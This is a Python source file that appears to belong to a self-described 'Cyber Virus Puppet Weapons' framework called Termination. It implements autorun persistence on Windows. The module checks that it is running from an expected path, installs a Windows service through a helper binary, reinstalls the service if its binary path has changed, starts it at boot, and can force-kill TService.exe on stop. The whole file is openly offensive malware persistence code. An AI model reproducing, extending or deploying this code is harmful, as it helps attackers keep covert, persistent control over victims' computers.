# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLhread/Thread_AutoRun
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# The program is set to start from booting,
# And the exploitation of the service does not limit the vulnerability.


from TLib import *
from TLib.T_imports import *


class AutoRunSetup(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination'):
        self.master: 'Termination4.Termination' = master
        self.desc: str = "AutoRun Setup"
        self._StopEvent.wait()
    def Setup(self):
        if os.path.abspath(self.master.__file__).lower() != os.path.abspath(self.master.WSD.__NeedFile__).lower():
            self.logger.Error("The Currently Running Program Is Not In The Correct Path")
            return -4
        else:
            self.logger.Success("The Program That Is Currently Running Is In The Correct Path")
        if not hasattr(self.master.WSD, "__NeedTService__"):
            self.logger.Error("WSD Is Not In The Correct State")
            return -5
        else:
            self.logger.Success("WSD Is In The Correct State")
        if not (service:=self.master.tpll.IsService(self.master.__service_name__)):
            if not (r:=self.master.tpll.Command([self.master.WSD.__NeedTService__, "/install", self.master.WSD.__NeedFile__])).successtatus():
                self.logger.Error("There Is An Error With The Installation Service")
                return False
            else:
                self.logger.Success("The Installation Service Was Successful")
        self.logger.Info(f"Binary Program Path: [{(b:=self.master.tpll.GetServiceBinpath(self.master.__service_name__))}], Command Segmentation: [{(p:=shlex.split(b) if b else False)}]")
        if b and p and os.path.abspath(p[-1]).lower() != os.path.abspath(self.master.WSD.__NeedFile__).lower():
            self.logger.Info(f"AUTORUN: EPATH {os.path.abspath(p[-1]).lower()} | {os.path.abspath(self.master.WSD.__NeedFile__).lower()}")
            if not (r1:=self.master.tpll.Command([self.master.WSD.__NeedTService__, "/uninstall"])).successtatus() or not (
                r2:=self.master.tpll.Command([self.master.WSD.__NeedTService__, "/install", self.master.WSD.__NeedFile__])).successtatus():
                self.logger.Error(f"The Reset Service Failed: U[{r1}] I[{r2}]")
            else:
                self.logger.Success("The Reset Service Was Successful")
        if not service or service.status() == "stopped":
            if not (r:=self.master.tpll.WindowsService.StartService(self.master.__service_name__)==True):
                self.logger.Error(f"Failed To Start The Service: [{r}]")
            else:
                self.logger.Success("Start The Service Successfully")
        return True
    def stop(self) -> bool:
        if (service := self.master.tpll.IsService(self.master.__service_name__)) and service.status() == "running":
            if not (r:=self.master.tpll.WindowsService.StopService(self.master.__service_name__) == True):
                self.master.TWNT.Updating=False
                return self.logger.Error(f"Fail To End The Service, Try Manually: [{r}]")
            else:
                os.system("taskkill /F /IM TService.exe")
                self.logger.Success("End Service Success")
                return True
        else:
            self.logger.Success("Service Has Been Discontinued")
            return True
    def iswork(self):
        return (service:=self.master.tpll.IsService(self.master.__service_name__)) and service.status() == "running"